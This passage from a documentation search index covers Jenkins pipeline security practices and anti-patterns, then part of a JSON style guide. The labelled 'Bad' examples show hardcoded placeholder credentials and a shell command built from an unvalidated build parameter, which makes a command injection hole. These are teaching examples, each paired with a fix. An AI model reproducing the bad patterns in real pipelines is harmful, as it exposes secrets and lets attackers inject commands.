}\n}\n</code></pre>","tags":["jenkins","groovy","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/jenkins_groovy/#security-best-practices","title":"Security Best Practices","text":"","tags":["jenkins","groovy","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/jenkins_groovy/#secure-credentials-management","title":"Secure Credentials Management","text":"<p>Never hardcode credentials in Jenkinsfiles:</p> <pre><code>// Bad - Hardcoded credentials\npipeline {\n    agent any\n    stages {\n        stage('Deploy') {\n            steps {\n                sh 'docker login -u myuser -p mypassword'  // \u274c Exposed!\n                sh 'aws configure set aws_access_key_id AKIAIOSFODNN7EXAMPLE'  // \u274c Hardcoded!\n            }\n        }\n    }\n}\n\n// Good - Use Jenkins credentials\npipeline {\n    agent any\n    environment {\n        DOCKER_CREDS = credentials('docker-hub-credentials')\n    }\n    stages {\n        stage('Deploy') {\n            steps {\n                sh 'echo $DOCKER_CREDS_PSW | docker login -u $DOCKER_CREDS_USR --password-stdin'\n            }\n        }\n    }\n}\n\n// Good - Use withCredentials for temporary access\npipeline {\n    agent any\n    stages {\n        stage('Deploy') {\n            steps {\n                withCredentials([usernamePassword(\n                    credentialsId: 'aws-credentials',\n                    usernameVariable: 'AWS_ACCESS_KEY_ID',\n                    passwordVariable: 'AWS_SECRET_ACCESS_KEY'\n                )]) {\n                    sh 'aws s3 sync ./dist s3://my-bucket'\n                }\n            }\n        }\n    }\n}\n\n// Good - SSH private key\npipeline {\n    agent any\n    stages {\n        stage('Deploy') {\n            steps {\n                withCredentials([sshUserPrivateKey(\n                    credentialsId: 'ssh-deploy-key',\n                    keyFileVariable: 'SSH_KEY',\n                    usernameVariable: 'SSH_USER'\n                )]) {\n                    sh 'ssh -i $SSH_KEY $SSH_USER@server.example.com \"deploy.sh\"'\n                }\n            }\n        }\n    }\n}\n</code></pre> <p>Key Points:</p> <ul> <li>Store credentials in Jenkins Credentials Manager</li> <li>Use <code>credentials()</code> helper or <code>withCredentials</code> block</li> <li>Never commit credentials to version control</li> <li>Rotate credentials regularly</li> <li>Use least-privilege service accounts</li> <li>Mask credentials in console output</li> </ul>","tags":["jenkins","groovy","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/jenkins_groovy/#code-injection-prevention","title":"Code Injection Prevention","text":"<p>Prevent command injection in pipeline scripts:</p> <pre><code>// Bad - Unvalidated user input\npipeline {\n    agent any\n    parameters {\n        string(name: 'BRANCH_NAME', defaultValue: 'main')\n    }\n    stages {\n        stage('Build') {\n            steps {\n                // \u274c Command injection vulnerability!\n                sh \"git checkout ${params.BRANCH_NAME}\"\n            }\n        }\n    }\n}\n\n// Good - Validate and sanitize inputs\npipeline {\n    agent any\n    parameters {\n        string(name: 'BRANCH_NAME', defaultValue: 'main')\n    }\n    stages {\n        stage('Validate Input') {\n            steps {\n                script {\n                    // Validate branch name format\n                    if (!params.BRANCH_NAME.matches('^[a-zA-Z0-9/_-]+$')) {\n                        error(\"Invalid branch name format\")\n                    }\n                    // Verify branch exists\n                    def branches = sh(\n                        script: 'git branch -r',\n                        returnStdout: true\n                    ).trim()\n                    if (!branches.contains(params.BRANCH_NAME)) {\n                        error(\"Branch does not exist\")\n                    }\n                }\n            }\n        }\n        stage('Build') {\n            steps {\n                sh \"git checkout ${params.BRANCH_NAME}\"\n            }\n        }\n    }\n}\n\n// Good - Use allow-lists for dynamic values\npipeline {\n    agent any\n    parameters {\n        choice(\n            name: 'ENVIRONMENT',\n            choices: ['dev', 'staging', 'production'],  // \u2705 Restricted choices\n            description: 'Deployment environment'\n        )\n    }\n    stages {\n        stage('Deploy') {\n            steps {\n                sh \"./deploy.sh ${params.ENVIRONMENT}\"\n            }\n        }\n    }\n}\n</code></pre> <p>Key Points:</p> <ul> <li>Always validate user inputs</li> <li>Use <code>choice</code> parameters instead of <code>string</code> when possible</li> <li>Sanitize all external inputs</li> <li>Use allow-lists for dynamic values</li> <li>Avoid string interpolation with untrusted data</li> <li>Never use Groovy <code>evaluate()</code> with user input</li> </ul>","tags":["jenkins","groovy","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/jenkins_groovy/#script-security-plugin","title":"Script Security Plugin","text":"<p>Enable and configure Script Security:</p> <pre><code>// Good - Use approved script methods\n@Library('my-shared-library') _\n\npipeline {\n    agent any\n    stages {\n        stage('Build') {\n            steps {\n                script {\n                    // Approved methods only\n                    def result = readFile('config.json')\n                    def config = readJSON text: result\n\n                    // Use shared library functions (pre-approved)\n                    buildDockerImage(\n                        imageName: config.imageName,\n                        tag: env.BUILD_NUMBER\n                    )\n                }\n            }\n        }\n    }\n}\n\n// Bad - Unapproved methods can be security risks\npipeline {\n    agent any\n    stages {\n        stage('Build') {\n            steps {\n                script {\n                    // \u274c May require admin approval\n                    def proc = \"ls -la\".execute()\n                    proc.waitFor()\n                }\n            }\n        }\n    }\n}\n</code></pre> <p>Key Points:</p> <ul> <li>Enable Script Security plugin</li> <li>Review and approve script methods carefully</li> <li>Use declarative pipelines over scripted when possible</li> <li>Limit who can approve script methods</li> <li>Audit approved methods regularly</li> <li>Use shared libraries for complex logic</li> </ul>","tags":["jenkins","groovy","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/jenkins_groovy/#access-control-and-authorization","title":"Access Control and Authorization","text":"<p>Implement proper access controls:</p> <pre><code>// Good - Restrict who can trigger builds\npipeline {\n    agent any\n\n    // Require specific user permissions\n    options {\n        buildDiscarder(logRotator(numToKeepStr: '10'))\n        disableConcurrentBuilds()\n    }\n\n    parameters {\n        string(name: 'DEPLOY_ENV', defaultValue: 'staging')\n    }\n\n    stages {\n        stage('Authorization Check') {\n            steps {\n                script {\n                    // Check if user is authorized for production deployments\n                    if (params.DEPLOY_ENV == 'production') {\n                        def user = currentBuild.getBuildCauses()[0]?.userId\n                        def authorizedUsers = ['admin', 'ops-team']\n\n                        if (!authorizedUsers.contains(user)) {\n                            error(\"User ${user} not authorized for production deployments\")\n                        }\n                    }\n                }\n            }\n        }\n\n        stage('Deploy') {\n            steps {\n                sh \"./deploy.sh ${params.DEPLOY_ENV}\"\n            }\n        }\n    }\n}\n\n// Good - Use manual approval for critical stages\npipeline {\n    agent any\n    stages {\n        stage('Build') {\n            steps {\n                sh 'make build'\n            }\n        }\n\n        stage('Deploy to Production') {\n            when {\n                branch 'main'\n            }\n            steps {\n                input message: 'Deploy to production?',\n                      ok: 'Deploy',\n                      submitter: 'admin,ops-team'  // Only specific users can approve\n\n                sh './deploy-production.sh'\n            }\n        }\n    }\n}\n</code></pre> <p>Key Points:</p> <ul> <li>Configure matrix-based security</li> <li>Use folder-level permissions</li> <li>Restrict who can trigger sensitive jobs</li> <li>Implement approval gates for critical deployments</li> <li>Use role-based access control (RBAC)</li> <li>Audit user permissions regularly</li> </ul>","tags":["jenkins","groovy","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/jenkins_groovy/#agent-and-node-security","title":"Agent and Node Security","text":"<p>Secure Jenkins agents and build nodes:</p> <pre><code>// Good - Use specific agent labels\npipeline {\n    agent {\n        label 'docker-trusted'  // Only run on trusted agents\n    }\n    stages {\n        stage('Build') {\n            steps {\n                sh 'docker build -t myapp .'\n            }\n        }\n    }\n}\n\n// Good - Use Docker agents with security constraints\npipeline {\n    agent {\n        docker {\n            image 'node:18-alpine'\n            args '-u root:root --read-only --tmpfs /tmp'  // Security constraints\n        }\n    }\n    stages {\n        stage('Build') {\n            steps {\n                sh 'npm ci &amp;&amp; npm run build'\n            }\n        }\n    }\n}\n\n// Good - Separate agents by environment\npipeline {\n    agent none\n    stages {\n        stage('Build') {\n            agent { label 'build-agents' }\n            steps {\n                sh 'make build'\n            }\n        }\n\n        stage('Deploy Production') {\n            agent { label 'production-agents' }  // Dedicated production agents\n            when {\n                branch 'main'\n            }\n            steps {\n                sh './deploy.sh'\n            }\n        }\n    }\n}\n</code></pre> <p>Key Points:</p> <ul> <li>Use dedicated agents for different environments</li> <li>Restrict agent access to sensitive resources</li> <li>Use Docker agents for isolation</li> <li>Implement agent authentication</li> <li>Monitor agent activity</li> <li>Keep agents updated and patched</li> </ul>","tags":["jenkins","groovy","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/jenkins_groovy/#artifact-security","title":"Artifact Security","text":"<p>Secure build artifacts:</p> <pre><code>// Good - Archive artifacts securely\npipeline {\n    agent any\n    stages {\n        stage('Build') {\n            steps {\n                sh 'make build'\n            }\n            post {\n                success {\n                    // Archive with fingerprinting for integrity\n                    archiveArtifacts artifacts: 'dist/**/*',\n                                   fingerprint: true,\n                                   allowEmptyArchive: false\n\n                    // Calculate and store checksums\n                    sh '''\n                        cd dist\n                        sha256sum * &gt; SHA256SUMS\n                    '''\n                    archiveArtifacts artifacts: 'dist/SHA256SUMS'\n                }\n            }\n        }\n    }\n}\n\n// Good - Sign artifacts\npipeline {\n    agent any\n    stages {\n        stage('Build and Sign') {\n            steps {\n                sh 'make build'\n\n                withCredentials([file(credentialsId: 'gpg-key', variable: 'GPG_KEY')]) {\n                    sh '''\n                        gpg --import $GPG_KEY\n                        gpg --armor --detach-sign dist/myapp.jar\n                    '''\n                }\n\n                archiveArtifacts artifacts: 'dist/myapp.jar*', fingerprint: true\n            }\n        }\n    }\n}\n</code></pre> <p>Key Points:</p> <ul> <li>Enable artifact fingerprinting</li> <li>Sign critical artifacts</li> <li>Generate checksums for verification</li> <li>Limit artifact retention time</li> <li>Control artifact access permissions</li> <li>Scan artifacts for vulnerabilities</li> </ul>","tags":["jenkins","groovy","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/jenkins_groovy/#dependency-and-plugin-security","title":"Dependency and Plugin Security","text":"<p>Manage dependencies and plugins securely:</p> <pre><code>// Good - Pin dependency versions\npipeline {\n    agent any\n    stages {\n        stage('Build') {\n            steps {\n                // Use lock files for reproducible builds\n                sh 'npm ci'  // Uses package-lock.json\n\n                // Audit dependencies\n                sh 'npm audit --audit-level=high'\n            }\n        }\n    }\n}\n\n// Good - Verify plugin signatures\n// Configure in Jenkins &gt; Manage Jenkins &gt; Configure System\n// Enable \"Check plugin signatures\" option\n</code></pre> <p>Key Points:</p> <ul> <li>Keep Jenkins and plugins updated</li> <li>Enable plugin signature verification</li> <li>Use dependency lock files</li> <li>Run dependency audits in pipelines</li> <li>Review plugin permissions</li> <li>Remove unused plugins</li> </ul>","tags":["jenkins","groovy","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/jenkins_groovy/#audit-logging","title":"Audit Logging","text":"<p>Enable comprehensive audit logging:</p> <pre><code>// Good - Log security-relevant events\npipeline {\n    agent any\n    stages {\n        stage('Deploy') {\n            steps {\n                script {\n                    def user = currentBuild.getBuildCauses()[0]?.userId ?: 'UNKNOWN'\n                    def timestamp = new Date().format('yyyy-MM-dd HH:mm:ss')\n\n                    echo \"AUDIT: Deployment initiated by ${user} at ${timestamp}\"\n                    echo \"AUDIT: Target environment: ${params.DEPLOY_ENV}\"\n                    echo \"AUDIT: Build number: ${env.BUILD_NUMBER}\"\n                }\n\n                sh './deploy.sh'\n            }\n            post {\n                always {\n                    script {\n                        def status = currentBuild.currentResult\n                        echo \"AUDIT: Deployment ${status} at ${new Date().format('yyyy-MM-dd HH:mm:ss')}\"\n                    }\n                }\n            }\n        }\n    }\n}\n</code></pre> <p>Key Points:</p> <ul> <li>Enable audit trail plugin</li> <li>Log all credential access</li> <li>Track who triggered builds</li> <li>Monitor failed login attempts</li> <li>Review audit logs regularly</li> <li>Retain logs for compliance</li> </ul>","tags":["jenkins","groovy","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/jenkins_groovy/#network-security","title":"Network Security","text":"<p>Secure network communications:</p> <pre><code>// Good - Use HTTPS for external calls\npipeline {\n    agent any\n    stages {\n        stage('API Call') {\n            steps {\n                script {\n                    // Always use HTTPS\n                    def response = httpRequest(\n                        url: 'https://api.example.com/data',\n                        authentication: 'api-token-credential',\n                        validResponseCodes: '200',\n                        timeout: 30\n                    )\n                }\n            }\n        }\n    }\n}\n\n// Good - Restrict outbound connections\n// Configure in Jenkins security settings:\n// - Use proxy for external connections\n// - Whitelist allowed domains\n// - Block access to internal networks from build agents\n</code></pre> <p>Key Points:</p> <ul> <li>Always use HTTPS for external communications</li> <li>Verify SSL/TLS certificates</li> <li>Use proxies for outbound connections</li> <li>Implement network segmentation</li> <li>Restrict agent network access</li> <li>Monitor network traffic</li> </ul>","tags":["jenkins","groovy","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/jenkins_groovy/#anti-patterns","title":"Anti-Patterns","text":"","tags":["jenkins","groovy","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/jenkins_groovy/#avoid-hardcoded-credentials","title":"\u274c Avoid: Hardcoded Credentials","text":"<pre><code>// Bad - Hardcoded credentials\nstage('Deploy') {\n    steps {\n        sh 'docker login -u myuser -p mypassword'\n    }\n}\n\n// Good - Use Jenkins credentials\nstage('Deploy') {\n    environment {\n        DOCKER_CREDS = credentials('docker-hub-credentials')\n    }\n    steps {\n        sh 'echo $DOCKER_CREDS_PSW | docker login -u $DOCKER_CREDS_USR --password-stdin'\n    }\n}\n</code></pre>","tags":["jenkins","groovy","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/jenkins_groovy/#avoid-overly-complex-pipelines","title":"\u274c Avoid: Overly Complex Pipelines","text":"<pre><code>// Bad - Too much logic in Jenkinsfile\npipeline {\n    agent any\n    stages {\n        stage('Build') {\n            steps {\n                script {\n                    // 200 lines of complex Groovy logic...\n                }\n            }\n        }\n    }\n}\n\n// Good - Use shared libraries\n@Library('my-shared-library') _\n\npipeline {\n    agent any\n    stages {\n        stage('Build') {\n            steps {\n                buildApplication(config: readYaml(file: 'build.yaml'))\n            }\n        }\n    }\n}\n</code></pre>","tags":["jenkins","groovy","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/jenkins_groovy/#avoid-no-cleanup","title":"\u274c Avoid: No Cleanup","text":"<pre><code>// Bad - No cleanup\npipeline {\n    agent any\n    stages {\n        stage('Build') {\n            steps {\n                sh 'make build'\n            }\n        }\n    }\n}\n\n// Good - Always cleanup workspace\npipeline {\n    agent any\n    stages {\n        stage('Build') {\n            steps {\n                sh 'make build'\n            }\n        }\n    }\n    post {\n        always {\n            cleanWs()\n        }\n    }\n}\n</code></pre>","tags":["jenkins","groovy","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/jenkins_groovy/#avoid-not-using-parallel-stages","title":"\u274c Avoid: Not Using Parallel Stages","text":"<pre><code>// Bad - Sequential execution\npipeline {\n    agent any\n    stages {\n        stage('Test') {\n            steps {\n                sh 'npm run test:unit'      // Runs first\n                sh 'npm run test:integration' // Then this\n                sh 'npm run test:e2e'        // Then this\n            }\n        }\n    }\n}\n\n// Good - Parallel execution\npipeline {\n    agent any\n    stages {\n        stage('Test') {\n            parallel {\n                stage('Unit') {\n                    steps { sh 'npm run test:unit' }\n                }\n                stage('Integration') {\n                    steps { sh 'npm run test:integration' }\n                }\n                stage('E2E') {\n                    steps { sh 'npm run test:e2e' }\n                }\n            }\n        }\n    }\n}\n</code></pre>","tags":["jenkins","groovy","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/jenkins_groovy/#avoid-no-timeouts","title":"\u274c Avoid: No Timeouts","text":"<pre><code>// Bad - Can hang indefinitely\npipeline {\n    agent any\n    stages {\n        stage('Deploy') {\n            steps {\n                sh './deploy.sh'  // \u274c No timeout\n            }\n        }\n    }\n}\n\n// Good - Set timeouts\npipeline {\n    agent any\n    options {\n        timeout(time: 1, unit: 'HOURS')  // \u2705 Pipeline timeout\n    }\n    stages {\n        stage('Deploy') {\n            options {\n                timeout(time: 30, unit: 'MINUTES')  // \u2705 Stage timeout\n            }\n            steps {\n                sh './deploy.sh'\n            }\n        }\n    }\n}\n</code></pre>","tags":["jenkins","groovy","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/jenkins_groovy/#avoid-using-node-instead-of-agent","title":"\u274c Avoid: Using 'node' Instead of 'agent'","text":"<pre><code>// Bad - Old scripted pipeline syntax\nnode {\n    stage('Build') {\n        checkout scm\n        sh 'make build'\n    }\n}\n\n// Good - Declarative pipeline with agent\npipeline {\n    agent any\n    stages {\n        stage('Build') {\n            steps {\n                checkout scm\n                sh 'make build'\n            }\n        }\n    }\n}\n</code></pre>","tags":["jenkins","groovy","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/jenkins_groovy/#avoid-not-handling-build-artifacts","title":"\u274c Avoid: Not Handling Build Artifacts","text":"<pre><code>// Bad - No artifact preservation\npipeline {\n    agent any\n    stages {\n        stage('Build') {\n            steps {\n                sh 'make build'  // \u274c Artifacts lost after build\n            }\n        }\n    }\n}\n\n// Good - Archive and stash artifacts\npipeline {\n    agent any\n    stages {\n        stage('Build') {\n            steps {\n                sh 'make build'\n            }\n            post {\n                success {\n                    archiveArtifacts artifacts: 'dist/**/*', fingerprint: true\n                    stash name: 'build-artifacts', includes: 'dist/**/*'\n                }\n            }\n        }\n        stage('Test') {\n            steps {\n                unstash 'build-artifacts'  // \u2705 Retrieve artifacts\n                sh 'make test'\n            }\n        }\n    }\n}\n</code></pre>","tags":["jenkins","groovy","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/jenkins_groovy/#tool-configurations","title":"Tool Configurations","text":"","tags":["jenkins","groovy","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/jenkins_groovy/#jenkinsfile-validation","title":"Jenkinsfile Validation","text":"<pre><code>## Validate Jenkinsfile syntax\ncurl -X POST -F \"jenkinsfile=&lt;Jenkinsfile\" http://jenkins.example.com/pipeline-model-converter/validate\n\n## Use Jenkins CLI\njava -jar jenkins-cli.jar -s http://jenkins.example.com/ declarative-linter &lt; Jenkinsfile\n</code></pre>","tags":["jenkins","groovy","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/jenkins_groovy/#vscode-extensions","title":"VSCode Extensions","text":"<ul> <li>Jenkins Pipeline Linter Connector: Validate Jenkinsfiles</li> <li>Jenkins Jack: Manage Jenkins jobs from VSCode</li> <li>Groovy: Syntax highlighting for Groovy</li> </ul>","tags":["jenkins","groovy","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/jenkins_groovy/#references","title":"References","text":"","tags":["jenkins","groovy","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/jenkins_groovy/#official-documentation","title":"Official Documentation","text":"<ul> <li>Jenkins Pipeline Documentation</li> <li>Pipeline Syntax Reference</li> <li>Shared Libraries</li> </ul>","tags":["jenkins","groovy","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/jenkins_groovy/#tools","title":"Tools","text":"<ul> <li>Jenkins Configuration as Code (JCasC)</li> <li>Jenkins CLI</li> <li>Blue Ocean - Modern Jenkins UI</li> </ul>","tags":["jenkins","groovy","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/jenkins_groovy/#best-practices","title":"Best Practices","text":"<ul> <li>Jenkins Best Practices</li> <li>CloudBees Pipeline Best Practices</li> </ul> <p>Version: 1.0.0 Last Updated: 2025-10-28 Status: Active</p>","tags":["jenkins","groovy","cicd","pipelines","automation","devops"]},{"location":"02_language_guides/json/","title":"JSON Style Guide","text":"","tags":["json","configuration","data","serialization","api"]},{"location":"02_language_guides/json/#language-overview","title":"Language Overview","text":"<p>JSON (JavaScript Object Notation) is a lightweight data-interchange format that is easy for humans to read and write and easy for machines to parse and generate. This guide covers JSON standards for configuration files, API responses, and data exchange.</p>","tags":["json","configuration","data","serialization","api"]},{"location":"02_language_guides/json/#key-characteristics","title":"Key Characteristics","text":"<ul> <li>Paradigm: Data serialization, configuration</li> <li>File Extension: <code>.json</code></li> <li>Primary Use: API responses, configuration files, data storage, package manifests</li> <li>Indentation: 2 spaces (consistent across all JSON files)</li> </ul>","tags":["json","configuration","data","serialization","api"]},{"location":"02_language_guides/json/#quick-reference","title":"Quick Reference","text":"Category Convention Example Notes Syntax Indentation 2 spaces <code>\"key\": \"value\"</code> Consistent 2-space indentation Key Names <code>camelCase</code> or <code>snake_case</code> <code>\"userName\"</code> or <code>\"user_name\"</code> Be consistent project-wide Quotes Double quotes only <code>\"key\": \"value\"</code> Strings must use double quotes Trailing Commas Not allowed <code>{\"a\": 1, \"b\": 2}</code> No comma after last element Data Types String <code>\"text\"</code> <code>\"hello world\"</code> Double-quoted text Number Numeric <code>42</code>, <code>3.14</code>, <code>-10</code> Integer or float Boolean <code>true</code> / <code>false</code> <code>\"active\": true</code> Lowercase only Null <code>null</code> <code>\"value\": null</code> Explicit null value Array <code>[...]</code> <code>[1, 2, 3]</code> Ordered collection Object <code>{...}</code> <code>{\"key\": \"value\"}</code> Key-value pairs Formatting Arrays (short) Single line <code>[1, 2, 3]</code> If fits on one line Arrays (long) Multi-line <code>[\\n  \"item1\",\\n  \"item2\"\\n]</code> One item per line Objects (short) Single line <code>{\"id\": 1}</code> If fits on one line Objects (long) Multi-line <code>{\\n  \"key\": \"value\"\\n}</code> One property per line Best Practices Validation Use JSON Schema Define structure and constraints Validate with schema Comments Not supported Use description fields JSON doesn't allow comments File Size Keep reasonable Consider NDJSON for large data Split large files Files Extension <code>.json</code> <code>config.json</code>, <code>package.json</code> Always <code>.json</code> Encoding UTF-8 <code>UTF-8 without BOM</code> Standard encoding","tags":["json","configuration","data","serialization","api"]},{"location":"02_language_guides/json/#basic-syntax","title":"Basic Syntax","text":"","tags":["json","configuration","data","serialization","api"]},{"location":"02_language_guides/json/#objects","title":"Objects","text":"<pre><code>{\n  \"name\": \"my-application\",\n  \"version\": \"1.0.0\",\n  \"description\": \"A sample application\"\n}\n</code></pre>","tags":["json","configuration","data","serialization","api"]},{"location":"02_language_guides/json/#arrays","title":"Arrays","text":"<pre><code>{\n  \"fruits\": [\"apple\", \"banana\", \"orange\"],\n  \"numbers\": [1, 2, 3, 4, 5]\n}\n</code></pre>","tags":["json","configuration","data","serialization","api"]},{"location":"02_language_guides/json/#nested-structures","title":"Nested Structures","text":"<pre><code>{\n  \"application\": {\n    \"name\": \"my-app\",\n    \"version\": \"1.0.0\",\n    \"config\": {\n      \"database\": {\n        \"host\": \"localhost\",\n        \"port\": 5432\n      },\n      \"cache\": {\n        \"type\": \"redis\",\n        \"ttl\": 3600\n      }\n    }\n  }\n}\n</code></pre>","tags":["json","configuration","data","serialization","api"]},{"location":"02_language_guides/json/#data-types","title":"Data Types","text":"","tags":["json","configuration","data","serialization","api"]},{"location":"02_language_guides/json/#strings","title":"Strings","text":"<pre><code>{\n  \"name\": \"John Doe\",\n  \"description\": \"A string with \\\"escaped quotes\\\"\",\n  \"path\": \"C:\\\\Windows\\\\System32\",\n  \"unicode\": \"Hello \\u4e16\\u754c\",\n  \"url\": \"https://example.com/path?query=value\"\n}\n</code></pre>","tags":["json","configuration","data","serialization","api"]},{"location":"02_language_guides/json/#numbers","title":"Numbers","text":"<pre><code>{\n  \"integer\": 42,\n  \"float\": 3.14159,\n  \"negative\": -100,\n  \"exponential\": 1.23e-4,\n  \"zero\": 0\n}\n</code></pre>","tags":["json","configuration","data","serialization","api"]},{"location":"02_language_guides/json/#booleans","title":"Booleans","text":"<pre><code>{\n  \"enabled\": true,\n  \"disabled\": false\n}\n</code></pre>","tags":["json","configuration","data","serialization","api"]},{"location":"02_language_guides/json/#null","title":"Null","text":"<pre><code>{\n  \"value\": null,\n  \"optional_field\": null\n}\n</code></pre>","tags":["json","configuration","data","serialization","api"]},{"location":"02_language_guides/json/#array-types","title":"Array Types","text":"<pre><code>{\n  \"empty_array\": [],\n  \"numbers\": [1, 2, 3],\n  \"mixed_types\": [1, \"two\", true, null],\n  \"nested_arrays\": [\n    [1, 2],\n    [3, 4]\n  ],\n  \"objects\": [\n    { \"id\": 1, \"name\": \"Alice\" },\n    { \"id\": 2, \"name\": \"Bob\" }\n  ]\n}\n</code></pre>","tags":["json","configuration","data","serialization","api"]},{"location":"02_language_guides/json/#package-configuration","title":"Package Configuration","text":"","tags":["json","configuration","data","serialization","api"]},{"location":"02_language_guides/json/#packagejson-nodejs","title":"package.json (Node.js)","text":"<pre><code>{\n  \"name\": \"my-application\",\n  \"version\": \"1.0.0\",\n  \"description\": \"A Node.js application\",\n  \"main\": \"index.js\",\n  \"scripts\": {\n    \"start\": \"node index.js\",\n    \"test\": \"jest\",\n    \"lint\": \"eslint src/\",\n    \"build\": \"webpack --mode production\"\n  },\n  \"keywords\": [\"nodejs\", \"application\"],\n  \"author\": \"Tyler Dukes &lt;tyler@example.com&gt;\",\n  \"license\": \"MIT\",\n  \"dependencies\": {\n    \"express\": \"^4.18.0\",\n    \"dotenv\": \"^16.0.0\"\n  },\n  \"devDependencies\": {\n    \"jest\": \"^29.0.0\",\n    \"eslint\": \"^8.0.0\"\n  },\n  \"engines\": {\n    \"node\": \"&gt;=18.0.0\",\n    \"npm\": \"&gt;=9.0.0\"\n  }\n}\n</code></pre>","tags":["json","configuration","data","serialization","api"]},{"location":"02_language_guides/json/#tsconfigjson-typescript","title":"tsconfig.json (TypeScript)","text":"<pre><code>{\n  \"compilerOptions\": {\n    \"target\": \"ES2022\",\n    \"module\": \"commonjs\",\n    \"lib\": [\"ES2022\"],\n    \"outDir\": \"./dist\",\n    \"rootDir\": \"./src\",\n    \"strict\": true,\n    \"esModuleInterop\": true,\n    \"skipLibCheck\": true,\n    \"forceConsistentCasingInFileNames\": true,\n    \"resolveJsonModule\": true,\n    \"declaration\": true,\n    \"declarationMap\": true,\n    \"sourceMap\": true\n  },\n  \"include\": [\"src/**/*\"],\n  \"exclude\": [\"node_modules\", \"dist\", \"**/*.spec.ts\"]\n}\n</code></pre>","tags":["json","configuration","data","serialization","api"]},{"location":"02_language_guides/json/#eslintrcjson-eslint","title":".eslintrc.json (ESLint)","text":"<pre><code>{\n  \"extends\": [\"eslint:recommended\", \"plugin:@typescript-eslint/recommended\"],\n  \"parser\": \"@typescript-eslint/parser\",\n  \"parserOptions\": {\n    \"ecmaVersion\": 2022,\n    \"sourceType\": \"module\"\n  },\n  \"plugins\": [\"@typescript-eslint\"],\n  \"rules\": {\n    \"no-console\": \"warn\",\n    \"no-unused-vars\": \"error\",\n    \"quotes\": [\"error\", \"single\"],\n    \"semi\": [\"error\", \"always\"]\n  },\n  \"env\": {\n    \"node\": true,\n    \"es2022\": true\n  }\n}\n</code></pre>","tags":["json","configuration","data","serialization","api"]},{"location":"02_language_guides/json/#api-response-format","title":"API Response Format","text":"","tags":["json","configuration","data","serialization","api"]},{"location":"02_language_guides/json/#success-response","title":"Success Response","text":"<pre><code>{\n  \"status\": \"success\",\n  \"data\": {\n    \"id\": 123,\n    \"name\": \"John Doe\",\n    \"email\": \"john.doe@example.com\",\n    \"created_at\": \"2025-01-15T10:30:00Z\"\n  },\n  \"metadata\": {\n    \"timestamp\": \"2025-01-15T10:30:00Z\",\n    \"version\": \"1.0.0\"\n  }\n}\n</code></pre>","tags":["json","configuration","data","serialization","api"]},{"location":"02_language_guides/json/#error-response","title":"Error Response","text":"<pre><code>{\n  \"status\": \"error\",\n  \"error\": {\n    \"code\": \"VALIDATION_ERROR\",\n    \"message\": \"Invalid email address\",\n    \"details\": {\n      \"field\": \"email\",\n      \"value\": \"invalid-email\",\n      \"constraint\": \"Must be a valid email address\"\n    }\n  },\n  \"metadata\": {\n    \"timestamp\": \"2025-01-15T10:30:00Z\",\n    \"request_id\": \"req_abc123\"\n  }\n}\n</code></pre>","tags":["json","configuration","data","serialization","api"]},{"location":"02_language_guides/json/#paginated-response","title":"Paginated Response","text":"<pre><code>{\n  \"status\": \"success\",\n  \"data\": [\n    { \"id\": 1, \"name\": \"Item 1\" },\n    { \"id\": 2, \"name\": \"Item 2\" },\n    { \"id\": 3, \"name\": \"Item 3\" }\n  ],\n  \"pagination\": {\n    \"total\": 100,\n    \"page\": 1,\n    \"per_page\": 10,\n    \"total_pages\": 10,\n    \"has_next\": true,\n    \"has_prev\": false\n  }\n}\n</code></pre>","tags":["json","configuration","data","serialization","api"]},{"location":"02_language_guides/json/#json-schema","title":"JSON Schema","text":"","tags":["json","configuration","data","serialization","api"]},{"location":"02_language_guides/json/#defining-a-schema","title":"Defining a Schema","text":"<pre><code>{\n  \"$schema\": \"http://json-schema.org/draft-07/schema#\",\n  \"title\": \"User\",\n  \"type\": \"object\",\n  \"properties\": {\n    \"id\": {\n      \"type\": \"integer\",\n      \"minimum\": 1\n    },\n    \"name\": {\n      \"type\": \"string\",\n      \"minLength\": 1,\n      \"maxLength\": 100\n    },\n    \"email\": {\n      \"type\": \"string\",\n      \"format\": \"email\"\n    },\n    \"age\": {\n      \"type\": \"integer\",\n      \"minimum\": 0,\n      \"maximum\": 150\n    },\n    \"roles\": {\n      \"type\": \"array\",\n      \"items\": {\n        \"type\": \"string\",\n        \"enum\": [\"admin\", \"user\", \"guest\"]\n      },\n      \"minItems\": 1,\n      \"uniqueItems\": true\n    }\n  },\n  \"required\": [\"id\", \"name\", \"email\"]\n}\n</code></pre>","tags":["json","configuration","data","serialization","api"]},{"location":"02_language_guides/json/#comments-in-json","title":"Comments in JSON","text":"<p>JSON does not support comments. Use these alternatives:</p>","tags":["json","configuration","data","serialization","api"]},{"location":"02_language_guides/json/#json5-with-comments","title":"JSON5 (with comments)","text":"<pre><code>{\n  // This is a comment\n  \"name\": \"my-app\",\n  /* Multi-line\n     comment */\n  \"version\": \"1.0.0\"\n}\n</code></pre>","tags":["json","configuration","data","serialization","api"]},{"location":"02_language_guides/json/#jsonc-vscode-configuration","title":"JSONC (VSCode configuration)","text":"<pre><code>{\n  // VSCode settings\n  \"editor.tabSize\": 2,\n  \"editor.insertSpaces\": true\n}\n</code></pre>","tags":["json","configuration","data","serialization","api"]},{"location":"02_language_guides/json/#standard-json-with-comment-keys","title":"Standard JSON with Comment Keys","text":"<pre><code>{\n  \"_comment\": \"This is a 